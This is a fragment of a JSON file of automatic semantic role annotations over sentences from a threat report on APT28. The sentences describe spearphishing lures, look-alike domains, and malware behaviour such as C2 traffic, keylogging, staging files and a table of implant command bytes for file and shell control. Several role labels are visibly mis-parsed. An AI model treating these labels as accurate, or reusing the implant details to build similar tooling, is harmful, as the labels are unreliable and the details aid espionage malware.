"ARG1": {"text": "\u2019s location and visibility"}}}, " Until 2013, the\nSOURFACE downloader used hard-coded IP\naddresses for C2 communications, whereas the\nfuture CORESHELL samples use domains": {"used": {"ARGM-TMP": {"text": "Until 2013"}, "ARG0": {"text": "the SOURFACE downloader"}, "V": {"text": "used", "index": 6}, "ARG1": {"text": "hard - coded IP addresses"}, "ARG2": {"text": "for C2 communications"}, "ARGM-ADV": {"text": "whereas the future CORESHELL samples use domains"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 9}, "ARG1": {"text": "IP addresses"}}, "use": {"ARG0": {"text": "the future CORESHELL samples"}, "V": {"text": "use", "index": 21}, "ARG1": {"text": "domains"}}}, " The backdoor attaches this file to a\n preformatted email and sends it out through a\n victim\u2019s mail server": {"attaches": {"ARG0": {"text": "The backdoor"}, "V": {"text": "attaches", "index": 2}, "ARG1": {"text": "this file to a preformatted email"}}, "preformatted": {"V": {"text": "preformatted", "index": 7}, "ARG1": {"text": "email"}}, "sends": {"ARG0": {"text": "The backdoor attaches"}, "V": {"text": "sends", "index": 10}, "ARG1": {"text": "it"}, "ARGM-MNR": {"text": "through a victim \u2019s mail server"}}}, " In the background,\nthe decoy document installed a SOURFACE\nbackdoor on the victim\u2019s system": {"installed": {"ARGM-LOC": {"text": "In the background"}, "ARG0": {"text": "the decoy document"}, "V": {"text": "installed", "index": 7}, "ARG1": {"text": "a SOURFACE backdoor on the victim \u2019s system"}}}, "\nThis tactic could allow APT28 to obtain data from\nthe MIA\u2019s network through a less-monitored\nroute, limiting the MIA network security\ndepartment\u2019s abilities to detect the traffic": {"could": {"ARG0": {"text": "This tactic"}, "V": {"text": "could", "index": 2}, "ARG1": {"text": "allow APT28 to obtain data from the MIA \u2019s network through a less - monitored route , limiting the MIA network security department \u2019s abilities to detect the traffic"}}, "allow": {"ARG0": {"text": "This tactic"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "allow", "index": 3}, "ARG1": {"text": "APT28 to obtain data from the MIA \u2019s network through a less - monitored route"}, "ARGM-ADV": {"text": "limiting the MIA network security department \u2019s abilities to detect the traffic"}}, "obtain": {"ARG0": {"text": "APT28"}, "V": {"text": "obtain", "index": 6}, "ARG1": {"text": "data"}, "ARG2": {"text": "from the MIA \u2019s network"}, "ARGM-MNR": {"text": "through a less - monitored route"}}, "monitored": {"ARGM-EXT": {"text": "less"}, "V": {"text": "monitored", "index": 17}, "ARG1": {"text": "route"}}, "limiting": {"ARG0": {"text": "APT28"}, "V": {"text": "limiting", "index": 20}, "ARG1": {"text": "the MIA network security department \u2019s abilities"}, "ARGM-PRP": {"text": "to detect the traffic"}}, "detect": {"ARG0": {"text": "the MIA network"}, "V": {"text": "detect", "index": 29}, "ARG1": {"text": "the traffic"}}}, "\n\nSeveral of the domains APT28 registered imitated\nNATO domain names, including those of NATO\nSpecial Operations Headquarters and the NATO\nFuture Forces Exhibition": {"registered": {"V": {"text": "registered", "index": 5}, "ARG1": {"text": "imitated"}}, "imitated": {"ARG0": {"text": "Several of the domains APT28 registered"}, "V": {"text": "imitated", "index": 6}, "ARG1": {"text": "NATO domain names"}}, "including": {"ARG2": {"text": "Several of the domains APT28 registered imitated NATO domain names"}, "V": {"text": "including", "index": 11}, "ARG1": {"text": "those of NATO Special Operations Headquarters and the NATO Future Forces Exhibition"}}}, " It creates a thread that records user activity on the host, capturing desktop\nscreenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window\ncontents (text, context menus, etc.)": {"creates": {"ARG0": {"text": "It"}, "V": {"text": "creates", "index": 1}, "ARG1": {"text": "a thread that records user activity on the host , capturing desktop screenshots in JPEG format , tracks current window focus , collects keystrokes , and scrapes window contents ( text , context menus , etc"}}, "records": {"ARG0": {"text": "a thread"}, "R-ARG0": {"text": "that"}, "V": {"text": "records", "index": 5}, "ARG1": {"text": "user activity on the host"}}, "user": {"ARG0": {"text": "records"}, "V": {"text": "user", "index": 6}, "ARG1": {"text": "activity"}, "ARGM-LOC": {"text": "on the host"}}, "capturing": {"V": {"text": "capturing", "index": 12}, "ARG1": {"text": "desktop screenshots in JPEG format"}}, "tracks": {"ARG0": {"text": "records user activity on the host , capturing desktop screenshots in JPEG format"}, "V": {"text": "tracks", "index": 19}, "ARG1": {"text": "current window focus"}}, "collects": {"ARG0": {"text": "records user activity on the host , capturing desktop screenshots in"}, "V": {"text": "collects", "index": 24}, "ARG1": {"text": "keystrokes"}}, "scrapes": {"ARG0": {"text": "records user activity on the host , capturing desktop screenshots in JPEG format"}, "V": {"text": "scrapes", "index": 28}, "ARG1": {"text": "window contents ( text , context menus , etc"}}}, " APT28 possibly crafted this document    \nto appear legitimate to all MIA system users and   \nintended to breach the MIA network specifically    \nusing the embedded malware": {"crafted": {"ARG0": {"text": "APT28"}, "ARGM-ADV": {"text": "possibly"}, "V": {"text": "crafted", "index": 2}, "ARG1": {"text": "this document"}, "ARGM-PRP": {"text": "to appear legitimate to all MIA system users and intended to breach the MIA network specifically using the embedded malware"}}, "appear": {"V": {"text": "appear", "index": 6}, "ARG1": {"text": "legitimate to all MIA system users"}}, "intended": {"ARG2": {"text": "this document"}, "V": {"text": "intended", "index": 14}, "ARG1": {"text": "to breach the MIA network specifically using the embedded malware"}}, "breach": {"ARG0": {"text": "this document"}, "V": {"text": "breach", "index": 16}, "ARG1": {"text": "the MIA network"}, "ARGM-MNR": {"text": "specifically using the embedded malware"}}, "using": {"ARGM-ADV": {"text": "specifically"}, "V": {"text": "using", "index": 21}, "ARG1": {"text": "the embedded malware"}}, "embedded": {"V": {"text": "embedded", "index": 23}, "ARG1": {"text": "malware"}}}, "\n\n\u2022     More recently, in August 2014 APT28 used a\n      lure (Figure 3) about hostilities surrounding a\n      Malaysia Airlines flight downed in Ukraine in\n      a probable attempt to compromise the Polish\n      government": {"used": {"ARGM-TMP": {"text": "\u2022 More recently/ in August 2014"}, "ARG0": {"text": "APT28"}, "V": {"text": "used", "index": 8}, "ARG1": {"text": "a lure ( Figure 3 ) about hostilities surrounding a Malaysia Airlines flight downed in Ukraine"}, "ARG2": {"text": "in a probable attempt to compromise the Polish government"}}, "surrounding": {"ARG1": {"text": "hostilities"}, "V": {"text": "surrounding", "index": 17}, "ARG2": {"text": "a Malaysia Airlines flight downed in Ukraine"}}, "downed": {"ARG1": {"text": "a Malaysia Airlines flight"}, "V": {"text": "downed", "index": 22}, "ARGM-LOC": {"text": "in Ukraine"}}, "compromise": {"V": {"text": "compromise", "index": 30}, "ARG1": {"text": "the Polish government"}}}, " After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2": {"sending": {"V": {"text": "sending", "index": 1}, "ARG1": {"text": "an initial HTTP GET"}}, "GET": {"ARGM-TMP": {"text": "initial HTTP"}, "V": {"text": "GET", "index": 5}}, "request": {"ARGM-TMP": {"text": "After sending an initial HTTP GET"}, "V": {"text": "request", "index": 6}, "ARG1": {"text": "it"}}, "uploads": {"ARGM-TMP": {"text": "After sending an initial HTTP GET request"}, "ARG0": {"text": "it"}, "V": {"text": "uploads", "index": 8}, "ARG1": {"text": "the file contents of edg6EF885E2"}}}, " One APT28 domain imitated a key\nChechen-focused news website, while the other\nappeared to target members of the Armenian\nmilitary by hosting a fake login page": {"imitated": {"ARG0": {"text": "One APT28 domain"}, "V": {"text": "imitated", "index": 3}, "ARG1": {"text": "a key Chechen - focused news website"}, "ARGM-ADV": {"text": "while the other appeared to target members of the Armenian military by hosting a fake login page"}}, "focused": {"V": {"text": "focused", "index": 8}, "ARG1": {"text": "news website"}}, "appeared": {"V": {"text": "appeared", "index": 15}, "C-ARG1": {"text": "to target members of the Armenian military"}, "ARG1": {"text": "by hosting a fake login page"}}, "target": {"ARG0": {"text": "the other"}, "V": {"text": "target", "index": 17}, "ARG1": {"text": "members of the Armenian military"}, "ARGM-MNR": {"text": "by hosting a fake login page"}}, "hosting": {"ARG0": {"text": "the other"}, "V": {"text": "hosting", "index": 24}, "ARG1": {"text": "a fake login page"}}}, " CHOPSTICK reads messages from the mailslot, encrypts them using RC4, and then stores the\nencrypted message in an edg6EF885E2.tmp temporary file": {"reads": {"ARG0": {"text": "CHOPSTICK"}, "V": {"text": "reads", "index": 1}, "ARG1": {"text": "messages"}, "ARG3": {"text": "from the mailslot , encrypts them using RC4"}}, "encrypts": {"ARG0": {"text": "CHOPSTICK"}, "V": {"text": "encrypts", "index": 7}, "ARG1": {"text": "them"}, "ARGM-MNR": {"text": "using RC4"}}, "using": {"V": {"text": "using", "index": 9}, "ARG1": {"text": "RC4"}}, "stores": {"ARG0": {"text": "CHOPSTICK"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "stores", "index": 14}, "ARG1": {"text": "the encrypted message"}, "ARG2": {"text": "in an edg6EF885E2.tmp temporary file"}}}, "\nJournalists critical of the Kremlin have long\nbeen targets of surveillance and harassment,\nand a number of governments and human\nrights organizations have publicly criticized the\ngovernment for its treatment of journalists and its\nincreasing consolidation of control over the media.<fn>9</fn>\n</section>\n\n<section>\n<heading>APT28\u2019s Other Targets in the Caucasus</heading>\nWe have seen APT28 register at least two\ndomains mimicking the domains of legitimate\norganizations in the Caucasus, as shown in the\ntable below": {"have": {"V": {"text": "have", "index": 5}}, "been": {"ARG1": {"text": "Journalists critical of the Kremlin"}, "ARGM-TMP": {"text": "long"}, "V": {"text": "been", "index": 7}, "ARG2": {"text": "targets of surveillance and harassment"}}, "have_2": {"V": {"text": "have", "index": 23}}, "criticized": {"ARG0": {"text": "a number of governments and human rights organizations"}, "ARGM-MNR": {"text": "publicly"}, "V": {"text": "criticized", "index": 25}, "ARG1": {"text": "the government"}, "ARG2": {"text": "for its treatment of journalists and its increasing consolidation of control over the media"}}, "increasing": {"V": {"text": "increasing", "index": 35}, "ARG1": {"text": "consolidation"}}, "have_3": {"V": {"text": "have", "index": 44}}, "seen": {"ARG0": {"text": "We"}, "V": {"text": "seen", "index": 45}, "ARG1": {"text": "APT28 register at least two domains mimicking the domains of legitimate organizations in the Caucasus"}, "ARGM-ADV": {"text": "as shown in the table below"}}, "register": {"ARGM-MNR": {"text": "APT28"}, "V": {"text": "register", "index": 47}, "ARG1": {"text": "at least two domains mimicking the domains of legitimate organizations in the Caucasus"}}, "mimicking": {"ARG0": {"text": "at least two domains"}, "V": {"text": "mimicking", "index": 52}, "ARG1": {"text": "the domains of legitimate organizations in the Caucasus"}}, "shown": {"V": {"text": "shown", "index": 63}, "ARGM-LOC": {"text": "in the table below"}}}, " Web Enterprise Security\nMBAMService                                          Malwarebytes Anti-Malware\n</table>\n\n\n\n<footer>35 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n\n\n <caption>Table 10: Applications detected by CHOPSTICK</caption>\n\n<table>\n\n Process Name\t                                               Application\n\n firefox.exe                                                 Mozilla Firefox\n iexplore.exe                                                Internet Explorer\n outlook.exe                                                 Microsoft Outlook\n opera.exe                                                   Opera Browser\n bat.exe                                                     Unknown\n msimn.exe                                                   Outlook Express\n vpngui.exe                                                  Cisco Anyconnect VPN client\n ipseca.exe                                                  IPsec VPN client\n ipsecc.exe                                                  IPsec VPN client\n openvpn.exe                                                 OpenVPN client\n openssl.exe                                                 OpenSSL\n openvpn-gui-1.0.3.exe                                       OpenVPN client\n msmsgs.exe                                                  Microsoft Messenger\n wuauclt.exe                                                 Windows Update\n chrome.exe                                                  Google Chrome Browser\n thebat.exe                                                  The Bat Secure Email Client\n skype.exe                                                   Skype Messenger\n</table>\n\n\n\n<footer>36 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n\n\nAfter collecting host information, CHOPSTICK creates a hidden file that may be named\n%ALLUSERSPROFILE%\\edg6EF885E2.tmp for temporary storage and creates a Windows mailslot with the\nname \u201ccheck_mes_v5555\u201d.<fn>28</fn> Its usage of a Windows mailslot would potentially allow external binaries to\nwrite data to the \u201ccheck_mes_v5555\u201d mailslot, possibly allowing CHOPSTICK to encrypt and store\noutput from other malware": {"would": {"ARG0": {"text": "Web Enterprise Security MBAMService Malwarebytes Anti - Malware Its usage of a Windows mailslot"}, "V": {"text": "would", "index": 14}, "ARGM-ADV": {"text": "potentially"}, "ARGM-CAU": {"text": "allow external binaries to write data to the \u201c check_mes_v5555 \u201d mailslot , possibly allowing CHOPSTICK to encrypt and store output from other malware"}}, "allow": {"ARG0": {"text": "Web Enterprise Security MBAMService Malwarebytes Anti - Malware Its usage of a Windows mailslot"}, "ARGM-MOD": {"text": "would"}, "ARGM-ADV": {"text": "potentially"}, "V": {"text": "allow", "index": 16}, "ARG1": {"text": "external binaries to write data to the \u201c check_mes_v5555 \u201d mailslot , possibly allowing CHOPSTICK to encrypt and store output from other malware"}}, "write": {"ARG0": {"text": "external binaries"}, "V": {"text": "write", "index": 20}, "ARG1": {"text": "data"}, "ARG2": {"text": "to the \u201c check_mes_v5555 \u201d mailslot"}, "ARGM-ADV": {"text": "possibly allowing CHOPSTICK to encrypt and store output from other malware"}}, "allowing": {"ARG0": {"text": "external binaries"}, "ARGM-ADV": {"text": "possibly"}, "V": {"text": "allowing", "index": 30}, "ARG1": {"text": "CHOPSTICK to encrypt and store output from other malware"}}, "encrypt": {"ARG1": {"text": "CHOPSTICK"}, "V": {"text": "encrypt", "index": 33}, "ARG2": {"text": "from"}}}, " Two of the malware            \nfamilies (SOURFACE/CORESHELL and                  \nEVILTOSS) use the same decryption                 \nsequence and similar algorithms for string        \nencoding and decoding": {"use": {"ARG0": {"text": "Two of the malware families ( SOURFACE / CORESHELL and EVILTOSS )"}, "V": {"text": "use", "index": 12}, "ARG1": {"text": "the same decryption sequence and similar algorithms"}, "ARG2": {"text": "for string encoding and decoding"}}, "encoding": {"ARG1": {"text": "string"}, "V": {"text": "encoding", "index": 22}}, "decoding": {"V": {"text": "decoding", "index": 24}}}, "\n\nThe first time CHOPSTICK is executed, it may encrypt and store configuration data in the Registry key\nHKU\\S-1-5-19_Classes\\Software\\Microsoft\\MediaPlayer\\{E6696105-E63E-4EF1-939E-\n15DDD83B669A}\\chnnl": {"is": {"V": {"text": "is", "index": 4}}, "executed": {"ARGM-TMP": {"text": "The first time"}, "ARG1": {"text": "CHOPSTICK"}, "V": {"text": "executed", "index": 5}}, "may": {"V": {"text": "may", "index": 8}}, "encrypt": {"ARGM-TMP": {"text": "The first time CHOPSTICK is executed"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "encrypt", "index": 9}, "ARG1": {"text": "data"}, "ARGM-LOC": {"text": "in the Registry key HKU\\S-1"}}, "store": {"ARGM-TMP": {"text": "The first time CHOPSTICK is executed"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "store", "index": 11}, "ARG1": {"text": "configuration data"}, "ARGM-LOC": {"text": "in the Registry key HKU\\S-1 - 5 - 19_Classes\\Software\\Microsoft\\MediaPlayer\\{E6696105-E63E-4EF1"}}}, " The backdoor sent data via\nSMTP to nato_smtp@mail[.]ru and received its\ntasking via POP from nato_pop@mail[.]ru": {"sent": {"ARG0": {"text": "The backdoor"}, "V": {"text": "sent", "index": 2}, "ARG1": {"text": "data"}, "ARGM-MNR": {"text": "via SMTP"}, "ARG2": {"text": "to nato_smtp@mail[.]ru"}}, "nato_smtp@mail[.]ru": {"ARG0": {"text": "data"}, "V": {"text": "nato_smtp@mail[.]ru", "index": 7}}, "received": {"ARG0": {"text": "The backdoor"}, "V": {"text": "received", "index": 9}, "ARG1": {"text": "its tasking"}, "ARGM-MNR": {"text": "via POP"}, "ARG2": {"text": "from nato_pop@mail[.]ru"}}}, " Some of the APT28-\nregistered domains imitated those of defense          \nevents held in Europe, such as the Farnborough        \nAirshow 2014, EuroNaval 2014, EUROSATORY              \n2014, and the Counter Terror Expo": {"registered": {"V": {"text": "registered", "index": 4}, "ARG1": {"text": "domains"}}, "imitated": {"ARG0": {"text": "Some of the APT28- registered domains"}, "V": {"text": "imitated", "index": 6}, "ARG1": {"text": "those of defense events held in Europe , such as the Farnborough Airshow 2014 , EuroNaval 2014 , EUROSATORY 2014 , and the Counter Terror Expo"}}, "held": {"ARG1": {"text": "defense events"}, "V": {"text": "held", "index": 11}, "ARGM-LOC": {"text": "in Europe"}}}, " This would\n     hinder static analysis of CORESHELL behavior\n     by creating a large amount of unnecessary\n     noise in the disassembly": {"would": {"ARG0": {"text": "This"}, "V": {"text": "would", "index": 1}, "ARG1": {"text": "hinder static analysis of CORESHELL behavior"}, "ARGM-MNR": {"text": "by creating a large amount of unnecessary noise in the disassembly"}}, "hinder": {"ARG0": {"text": "This"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "hinder", "index": 2}, "ARG1": {"text": "static analysis of CORESHELL behavior"}, "ARG2": {"text": "by creating a large amount of unnecessary noise in the disassembly"}}, "creating": {"ARG0": {"text": "This"}, "V": {"text": "creating", "index": 9}, "ARG1": {"text": "a large amount of unnecessary noise in the disassembly"}}}, " The modules that are included in an instance of CHOPSTICK\nmay be reported to the C2 server as part of POST messages": {"are": {"V": {"text": "are", "index": 3}}, "included": {"ARG1": {"text": "The modules"}, "R-ARG1": {"text": "that"}, "V": {"text": "included", "index": 4}, "ARG2": {"text": "in an instance of CHOPSTICK"}}, "may": {"ARGM-MOD": {"text": "may"}}, "be": {"V": {"text": "be", "index": 11}}, "reported": {"ARG1": {"text": "The modules that are included in an instance of CHOPSTICK"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "reported", "index": 12}, "ARG2": {"text": "to the C2 server"}, "ARGM-PRD": {"text": "as part of POST messages"}}}, " The backdoor was installed\nalongside the NATO-themed decoy document\ndepicted in Figure 8": {"was": {"V": {"text": "was", "index": 2}}, "installed": {"ARG1": {"text": "The backdoor"}, "V": {"text": "installed", "index": 3}, "ARG2": {"text": "alongside the NATO - themed decoy document depicted in Figure 8"}}, "themed": {"ARG0": {"text": "NATO"}, "V": {"text": "themed", "index": 8}, "ARG1": {"text": "decoy document"}}, "depicted": {"ARG1": {"text": "the NATO - themed decoy document"}, "V": {"text": "depicted", "index": 11}, "ARGM-PRD": {"text": "in Figure 8"}}}, " It also tests for the installation of specific security\nproducts (Table 9) and applications (Table 10)": {"tests": {"ARG0": {"text": "It"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "tests", "index": 2}, "ARG1": {"text": "for the installation of specific security products ( Table 9 ) and applications ( Table 10 )"}}}, "\n\nAfter approximately 60 seconds of execution time, CHOPSTICK begins communicating with one of its C2\nservers over HTTP": {"begins": {"ARGM-TMP": {"text": "After approximately 60 seconds of execution time"}, "ARG0": {"text": "CHOPSTICK"}, "V": {"text": "begins", "index": 9}, "ARG1": {"text": "communicating"}, "ARGM-PRD": {"text": "with one of its C2 servers over HTTP"}}, "communicating": {"ARGM-TMP": {"text": "After approximately 60 seconds of execution time"}, "ARG0": {"text": "CHOPSTICK"}, "V": {"text": "communicating", "index": 10}, "ARGM-MNR": {"text": "with one of its C2 servers"}, "ARG1": {"text": "over HTTP"}}}, "\n      One variant of CHOPSTICK focuses on\n      apparent air gap / closed network capabilities\n      by routing messages between local\n      directories, the registry and USB drives": {"focuses": {"ARG0": {"text": "One variant of CHOPSTICK"}, "V": {"text": "focuses", "index": 4}, "ARG2": {"text": "on apparent air gap / closed network capabilities by routing messages between local directories , the registry and USB drives"}}, "closed": {"V": {"text": "closed", "index": 10}, "ARG1": {"text": "network capabilities"}}, "routing": {"ARG0": {"text": "One variant of CHOPSTICK"}, "V": {"text": "routing", "index": 14}, "ARG1": {"text": "messages between local directories , the registry and USB drives"}}}, "                                 \n                                                      \nCORESHELL uses two threads to communicate             \nwith its C2 server": {"uses": {"ARG0": {"text": "CORESHELL"}, "V": {"text": "uses", "index": 1}, "ARG1": {"text": "two threads"}, "ARG2": {"text": "to communicate with its C2 server"}}, "communicate": {"ARG0": {"text": "CORESHELL"}, "V": {"text": "communicate", "index": 5}, "ARG2": {"text": "with its C2 server"}}}, "\n\n\n   <caption>Table 14: Commands understood by modFS (0x1101) module</caption>\n\n<table>\n\n   Command ID\t             Description         Example\n\n   01                      Find file           \\x01\\x11\\x01Directory&file&[01]\n\n   02                      Read file           \\x01\\x11\\x02Directory&file&[01]\n   03                      Write file          \\x01\\x11\\x03Directory&file&[Contents]\n\n   04                      Delete file         \\x01\\x11\\x04Directory&file&[01]\n   05                      Execute file        \\x01\\x11\\x05Directory&file&[01]\n\n</table>\n\n   <caption>Table 15: Commands understood by modProcRet (0x1301) module</caption>\n\n<table>\n\n   Command ID\t             Description         Example\n\n   00                      CMD.exe output      \\x01\\x13\\x00[Output]\n\n   01                      CMD.exe start       \\x01\\x13\\x01\n   02                      CMD.exe exit        \\x01\\x13\\x02\n\n   11                      CMD.exe input       \\x01\\x13\\x11[Input]\n</table>\n</section>\n\n<footer>42 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX E:\nOLDBAIT</heading>\n\n\n\n\nOLDBAIT is a credential harvester that installs itself in %ALLUSERPROFILE%\\\\Application Data\\\nMicrosoft\\MediaPlayer\\updatewindws.exe": {"is": {"ARG1": {"text": "OLDBAIT"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a credential harvester that installs itself in % ALLUSERPROFILE%\\\\Application Data\\ Microsoft\\MediaPlayer\\updatewindws.exe"}}, "installs": {"ARG0": {"text": "a credential harvester"}, "R-ARG0": {"text": "that"}, "V": {"text": "installs", "index": 6}, "ARG1": {"text": "itself"}, "ARG2": {"text": "in % ALLUSERPROFILE%\\\\Application Data\\ Microsoft\\MediaPlayer\\updatewindws.exe"}}}, " The first thread sends beacons    \nthat contain the process listing of the               \ncompromised host": {"sends": {"ARG0": {"text": "The first thread"}, "V": {"text": "sends", "index": 3}, "ARG1": {"text": "beacons that contain the process listing of the compromised host"}}, "contain": {"ARG0": {"text": "beacons"}, "R-ARG0": {"text": "that"}, "V": {"text": "contain", "index": 6}, "ARG1": {"text": "the process listing of the compromised host"}}, "listing": {"ARG1": {"text": "the process/ of the compromised host"}, "V": {"text": "listing", "index": 9}}, "compromised": {"V": {"text": "compromised", "index": 12}, "ARG1": {"text": "host"}}}, "                       \n\nSince 2011, APT28 has used lures written in\nGeorgian that are probably intended to target\nGeorgian government agencies or citizens": {"has": {"V": {"text": "has", "index": 4}}, "used": {"ARGM-TMP": {"text": "Since 2011"}, "ARG0": {"text": "APT28"}, "V": {"text": "used", "index": 5}, "ARG1": {"text": "lures written in Georgian that are probably intended to target Georgian government agencies or citizens"}}, "written": {"V": {"text": "written", "index": 7}, "ARGM-LOC": {"text": "in Georgian that are probably intended to target Georgian government agencies or citizens"}}, "are": {"V": {"text": "are", "index": 11}}, "intended": {"ARG2": {"text": "Georgian"}, "R-ARG2": {"text": "that"}, "ARGM-ADV": {"text": "probably"}, "V": {"text": "intended", "index": 13}, "ARG1": {"text": "to target Georgian government agencies or citizens"}}, "target": {"ARG0": {"text": "that"}, "V": {"text": "target", "index": 15}, "ARG1": {"text": "Georgian government agencies or citizens"}}}, "\n      One CHOPSTICK v1 variant contained\n      modules and functions for collecting\n      keystroke logs, Microsoft Office documents,\n      and PGP files": {"contained": {"ARG0": {"text": "One CHOPSTICK v1 variant"}, "V": {"text": "contained", "index": 4}, "ARG1": {"text": "modules and functions"}, "ARG2": {"text": "for collecting keystroke logs , Microsoft Office documents , and PGP files"}}, "collecting": {"V": {"text": "collecting", "index": 9}, "ARG1": {"text": "keystroke logs"}}}, "\nThe configuration block is encrypted using RC4 encryption": {"is": {"ARG1": {"text": "The configuration block"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "encrypted using RC4 encryption"}}, "encrypted": {"ARG1": {"text": "The configuration block"}, "V": {"text": "encrypted", "index": 4}, "ARGM-MNR": {"text": "using RC4 encryption"}}, "using": {"V": {"text": "using", "index": 5}, "ARG1": {"text": "RC4 encryption"}}}, " APT28 used a lure\ndocument that installed a SOURFACE downloader\n(further discussed in the Malware section) and\ncontained a listing of birthdays for members of a\nworking group between the Georgian MOD and\nthe U.S": {"used": {"ARG0": {"text": "APT28"}, "V": {"text": "used", "index": 1}, "ARG1": {"text": "a lure document that installed a SOURFACE downloader ( further discussed in the Malware section )"}}, "installed": {"ARG0": {"text": "a lure document"}, "R-ARG0": {"text": "that"}, "V": {"text": "installed", "index": 6}, "ARG1": {"text": "a SOURFACE downloader ( further discussed in the Malware section )"}}, "discussed": {"ARG1": {"text": "a SOURFACE downloader"}, "ARGM-EXT": {"text": "further"}, "V": {"text": "discussed", "index": 12}, "ARGM-LOC": {"text": "in the Malware section )"}}, "contained": {"ARG0": {"text": "a lure document"}, "R-ARG0": {"text": "that"}, "V": {"text": "contained", "index": 19}, "ARG1": {"text": "a listing of birthdays for members of a working group between the Georgian MOD and the U.S"}}, "working": {"V": {"text": "working", "index": 28}, "ARG0": {"text": "group"}}}, " It\n      used one of four embedded sender email\n      addresses (@mia.gov.ge) to send files via\n      email to another email address on the same\n      mail server": {"used": {"ARG0": {"text": "It"}, "V": {"text": "used", "index": 1}, "ARG1": {"text": "one of four embedded sender email addresses ("}, "ARGM-LOC": {"text": "@mia.gov.ge )"}, "ARG2": {"text": "to send files"}, "ARGM-MNR": {"text": "via email to another email address on the same mail server"}}, "embedded": {"V": {"text": "embedded", "index": 5}}, "send": {"V": {"text": "send", "index": 13}, "ARG1": {"text": "files"}, "ARGM-MNR": {"text": "via email"}, "ARG2": {"text": "to another email address on the same mail server"}}}, " The                         \n backdoor encrypts data that it uploads with an RSA                     \n public key": {"encrypts": {"ARG0": {"text": "The backdoor"}, "V": {"text": "encrypts", "index": 2}, "ARG1": {"text": "data"}, "ARG2": {"text": "with an RSA public key"}}, "uploads": {"ARG0": {"text": "it"}, "V": {"text": "uploads", "index": 6}, "ARGM-MNR": {"text": "with an RSA public key"}}}, "             \n                                                     \nAPT28 has attempted to obfuscate their code and      \nimplement counter-analysis techniques:  \n\n\u2022    One of the latest samples of CORESHELL\n     includes counter-reverse engineering tactics\n     via unused machine instructions": {"has": {"V": {"text": "has", "index": 1}}, "attempted": {"ARG0": {"text": "APT28"}, "V": {"text": "attempted", "index": 2}, "ARG1": {"text": "to obfuscate their code and implement counter - analysis techniques"}}, "obfuscate": {"ARG0": {"text": "APT28"}, "V": {"text": "obfuscate", "index": 4}, "ARG1": {"text": "their code"}}, "implement": {"ARG0": {"text": "APT28"}, "V": {"text": "implement", "index": 8}, "ARG1": {"text": "counter - analysis techniques"}}, "includes": {"ARG2": {"text": "\u2022 One of the latest samples of CORESHELL"}, "V": {"text": "includes", "index": 22}, "ARG1": {"text": "counter - reverse engineering tactics"}, "ARGM-MNR": {"text": "via unused machine instructions"}}}, "                     \n                                                     \nAPT28 uses spearphishing emails to target its                                                  \nvictims, a common tactic in which the threat group   \ncrafts its emails to mention specific topics (lures) \nrelevant to recipients": {"uses": {"ARG0": {"text": "APT28"}, "V": {"text": "uses", "index": 1}, "ARG1": {"text": "spearphishing emails"}, "ARG2": {"text": "to target its victims , a common tactic in which the threat group crafts its emails to mention specific topics ( lures ) relevant to recipients"}}, "spearphishing": {"ARG0": {"text": "APT28"}, "V": {"text": "spearphishing", "index": 2}, "ARG1": {"text": "emails"}, "ARGM-PRP": {"text": "to target its victims , a common tactic in which the threat group crafts its emails to mention specific topics ( lures ) relevant to recipients"}}, "target": {"ARG0": {"text": "APT28"}, "V": {"text": "target", "index": 5}, "ARG1": {"text": "its victims , a common tactic in which the threat group crafts its emails to mention specific topics ( lures ) relevant to recipients"}}, "crafts": {"ARGM-LOC": {"text": "a common tactic"}, "R-ARGM-LOC": {"text": "in which"}, "ARG0": {"text": "the threat group"}, "V": {"text": "crafts", "index": 17}, "ARG1": {"text": "its emails"}, "ARGM-PNC": {"text": "to mention specific topics ( lures ) relevant to recipients"}}, "mention": {"ARG0": {"text": "the threat group"}, "V": {"text": "mention", "index": 21}, "ARG1": {"text": "specific topics ( lures ) relevant to recipients"}}}, "\nThe decoy document also contains metadata listing\n\u201cMIA\u201d as the company name and \u201cBeka Nozadze\u201d<fn>4</fn>\nas an author, a possible reference to a system\nadministrator in Tbilisi": {"contains": {"ARG0": {"text": "The decoy document"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "contains", "index": 4}, "ARG1": {"text": "metadata listing \u201c MIA \u201d as the company name and \u201c Beka Nozadze \u201d as an author , a possible reference to a system administrator in Tbilisi"}}, "listing": {"ARG0": {"text": "metadata"}, "V": {"text": "listing", "index": 6}, "ARG1": {"text": "\u201c MIA \u201d"}, "ARGM-PRD": {"text": "as the company name"}}}, " The monitoring for new files of\n      interest is performed by a \u201cDirectory\n      Observer\u201d module": {"is": {"V": {"text": "is", "index": 7}}, "performed": {"ARG1": {"text": "The monitoring for new files of interest"}, "V": {"text": "performed", "index": 8}, "ARG0": {"text": "by a \u201c Directory Observer \u201d module"}}}, " The second thread is                \nresponsible for downloading and executing stage\ntwo payloads": {"is": {"ARG1": {"text": "The second thread"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "responsible for downloading and executing stage two payloads"}}, "downloading": {"V": {"text": "downloading", "index": 6}, "ARG1": {"text": "two payloads"}}, "executing": {"V": {"text": "executing", "index": 8}, "ARG1": {"text": "stage two payloads"}}}, "\n\nAfter uploading edg6EF885E2.tmp, CHOPSTICK continues to query its C2 servers for commands using\nHTTP GET requests": {"uploading": {"V": {"text": "uploading", "index": 1}, "ARG1": {"text": "edg6EF885E2.tmp"}, "ARG0": {"text": "CHOPSTICK"}}, "continues": {"ARGM-TMP": {"text": "After uploading edg6EF885E2.tmp"}, "ARG0": {"text": "CHOPSTICK"}, "V": {"text": "continues", "index": 5}, "ARG1": 